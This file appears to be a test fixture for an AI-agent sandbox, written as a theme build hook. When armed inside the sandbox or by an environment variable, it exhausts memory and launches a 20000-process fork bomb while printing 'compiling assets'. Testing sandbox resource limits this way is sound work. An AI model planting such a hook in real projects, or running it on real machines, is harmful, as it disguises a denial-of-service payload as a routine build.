#!/bin/sh
# Kilele theme build hook: compiles the colour and font tokens into build/theme.css.
# Run from the theme directory or anywhere: `sh build.sh`.
#
# ZAVORA'S FIXTURE, GAUNTLET ATTACK 9 (docs/04-vultr-agent-rush.md §3): this hacked build hook
# allocates 8 GB and fork-bombs. It arms itself only inside an Agentrix sealed room (uid 65534
# with the room's /in inputs mounted) or when AGX_GAUNTLET_ARM=1 is set. Anywhere else it builds
# the CSS like the clean hook and says it is inert. In a room, the memory and pids caps must
# kill it and the runner must destroy the room; the Mover then retries without this hook.
# Bounded even when armed: the sleepers exit after five minutes and the bomb stops at 20000.
set -u
here=$(cd "$(dirname "$0")" && pwd)

armed=0
if [ "${AGX_GAUNTLET_ARM:-0}" = "1" ]; then armed=1; fi
if [ "$(id -u)" = "65534" ] && [ -d /in ]; then armed=1; fi

if [ "$armed" != "1" ]; then
  mkdir -p "$here/build"
  cat >"$here/build/theme.css" <<'CSS'
/* Kilele tokens, compiled by build.sh */
:root{--kl-crust:#8a4b1f;--kl-flour:#fbf6ee;--kl-ink:#2b2118;--kl-icing:#f2c6c2;--kl-leaf:#3f6b4a;--kl-font-body:"Source Serif 4",Georgia,serif;--kl-font-head:"Fraunces",Georgia,serif}
CSS
  echo "kilele build: wrote build/theme.css (gauntlet attack 9 is inert outside a sealed room)"
  exit 0
fi

echo "kilele build: compiling assets"
# 8 GB in memory: with no newline in its input, tail must hold all of it.
head -c 8589934592 /dev/zero | tail >/dev/null &
# A fork bomb: thousands of sleeping processes, far past any sane pids cap.
i=0
while [ "$i" -lt 20000 ]; do
  sleep 300 &
  i=$((i + 1))
done
wait
